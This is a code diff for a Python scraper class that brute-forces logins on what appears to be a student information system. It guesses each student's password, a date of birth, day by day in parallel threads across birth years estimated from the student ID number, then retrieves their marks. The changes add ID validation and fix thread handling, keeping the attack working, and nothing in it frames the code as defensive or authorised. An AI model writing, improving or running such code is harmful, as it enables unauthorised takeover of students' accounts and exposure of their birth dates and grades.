@@ -1,7 +1,7 @@
-from typing import Union
 from threading import Thread
+from typing import Union
 
-from scraper import Scraper, get_cache, set_cache, cached, roll_range, gen_usn
+from scraper import Scraper, get_cache, set_cache, cached, roll_range, gen_usn, validate_usn
 
 CACHE_NAME = "siscacheri92gh45"
 
@@ -90,12 +90,20 @@ class SisScraper(Scraper):
 		for worker in workers: worker.join()
 		return marks
 
-	def brute_month(self, usn: str, year: int, month: int, *, _INTERNAL_THREAD_USE: list = None) -> Union[
-		str, None, bool]:
+	def brute_month(self, usn: str, year: int, month: int, *, _INTERNAL_THREAD_USE: list = None) \
+			-> Union[str, None, bool]:
 		assert isinstance(_INTERNAL_THREAD_USE, list) or _INTERNAL_THREAD_USE is None
+		if _INTERNAL_THREAD_USE is None:
+			usn = usn.upper()
+			if not validate_usn(usn):
+				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(None)
+				return
+
 		payload = gen_payload()
 		for day in range(1, 32):
-			if _INTERNAL_THREAD_USE is not None and any(_INTERNAL_THREAD_USE): return
+			if _INTERNAL_THREAD_USE is not None and any(_INTERNAL_THREAD_USE):
+				_INTERNAL_THREAD_USE.append(False)
+				return False
 			payload['username'] = usn.lower()
 			payload['passwd'] = f"{year}-{month:02}-{day:02}"
 			try:
@@ -107,11 +115,13 @@ class SisScraper(Scraper):
 			if body is not None:
 				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(payload['passwd'])
 				return payload['passwd']
-		_INTERNAL_THREAD_USE.append(False)
+		if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(False)
 		return False
 
 	@cached(get_cache(CACHE_NAME))
 	def brute_year(self, *, usn: str, year: int) -> Union[str, None, bool]:
+		usn = usn.upper()
+		if not validate_usn(usn): return
 		workers = []
 		dob = []
 		for month in range(1, 13):
@@ -126,6 +136,8 @@ class SisScraper(Scraper):
 		if all_false: return False
 
 	def get_dob(self, usn) -> Union[str, None]:
+		usn = usn.upper()
+		if not validate_usn(usn): return
 		join_year = int("20" + usn[3:5])
 		for year in [y := join_year - 18, y - 1, y + 1, y - 2, y - 3]:
 			if dob := self.brute_year(usn=usn, year=year): return dob
